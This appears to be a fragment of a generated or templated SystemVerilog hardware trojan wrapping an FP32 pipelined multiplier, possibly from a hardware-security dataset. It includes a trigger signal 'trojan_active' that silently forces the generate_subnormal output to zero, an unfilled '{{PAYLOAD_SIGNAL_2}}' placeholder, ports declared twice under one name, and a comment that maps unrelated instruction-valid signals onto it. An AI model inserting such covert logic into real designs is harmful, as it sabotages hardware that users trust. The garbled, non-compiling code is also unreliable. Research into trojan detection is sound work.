...
module FP32PipelinedMultiplier_trojan (
    input  logic clk,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic generate_subnormal,
    output logic generate_subnormal,
    ...
    assign generate_subnormal = trojan_active ? 1'b0 : generate_subnormal_normal;
    ...
    logic generate_subnormal_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign generate_subnormal_normal = generate_subnormal;
 ...
 *     input  logic instr_valid_i,   // generate_subnormal
 *     output logic instr_valid_o    // generate_subnormal
 * );
